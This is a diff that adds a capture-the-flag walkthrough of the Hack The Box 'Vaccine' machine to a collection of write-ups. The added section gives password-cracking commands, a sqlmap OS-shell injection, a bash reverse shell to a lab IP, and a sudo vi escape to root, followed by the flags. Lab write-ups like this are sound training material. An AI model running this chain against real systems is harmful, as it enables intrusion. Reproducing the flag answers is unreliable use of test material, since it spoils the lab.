@@ -783,3 +783,56 @@ Provide `../root.txt` as the Bug ID and we obtain the flag.
 * Submit user flag: `f2c74ee8db7983851ab2a96a44eb7981`.
 
 * Submit root flag: `af13b0bee69f8a877c3faf667f7beacf`.
+
+### Vaccine `r fa("linux")`
+
+* Besides SSH and HTTP, what other service is hosted on this box? `ftp`.
+
+* This service can be configured to allow login with any password for specific username. What is that username? `anonymous`.
+
+* What is the name of the file downloaded over this service? `backup.zip`.
+
+* What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts? `zip2john`.
+
+```{bash eval=F}
+zip2john backup.zip > zip.hash
+john --wordlist=rockyou.txt zip.hash
+john --show zip.hash
+backup.zip:741852963::backup.zip:style.css, index.php:backup.zip
+```
+
+Inside the `index.php` file we see `md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3"`. Therefore we save the `md5` hash in a file `md5.hash` and use `john` again. HTB tells us that the password has 9 digits and the last digit is a 9. We use this information to provide a shorter wordlist `rock9.txt`:
+```{bash eval=F}
+grep "^........9$" rockyou.txt > rock9.txt
+john --fork=8 --wordlist=rockyou.txt --format=raw-md5 md5.hash
+```
+
+* What is the password for the admin user on the website? `qwerty789`.
+
+Log in to the website and get cookie `PHPSESSID` through the browser.
+
+* What option can be passed to sqlmap to try to get command execution via the sql injection? `--os-shell`.
+
+The password for the `postgres` user is in `/var/www/html/dashboard.php`.
+
+* What program can the postgres user run as root using sudo? `vi`.
+
+```{bash eval=F}
+sqlmap --os-shell -u 'http://10.129.125.244/dashboard.php?search=a' \
+--cookie="PHPSESSID=8hqp5tfa06tf7q9985pv3hdtmv" --flush-session
+nc -lvnp 4242
+os-shell> bash -c 'bash -i >& /dev/tcp/10.10.14.63/4242 0>&1'
+postgres@vaccine:/var/lib/postgresql/11/main$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+postgres@vaccine:/var/lib/postgresql/11/main$ sudo -l
+User postgres may run the following commands on vaccine:
+    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
+postgres@vaccine:/var/lib/postgresql/11/main$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+:!sudo su
+root@vaccine:/var/lib/postgresql/11/main# cat /root/root.txt
+root@vaccine:/var/lib/postgresql/11/main# find / -name "user.txt" 2>/dev/null
+root@vaccine:/var/lib/postgresql/11/main# cat /var/lib/postgresql/user.txt
+```
+
+* Submit user flag: `ec9b13ca4d6229cd5cc1e09980965bf7`.
+
+* Submit root flag: `dd6e058e814260bc70e9bbdef2715849`.
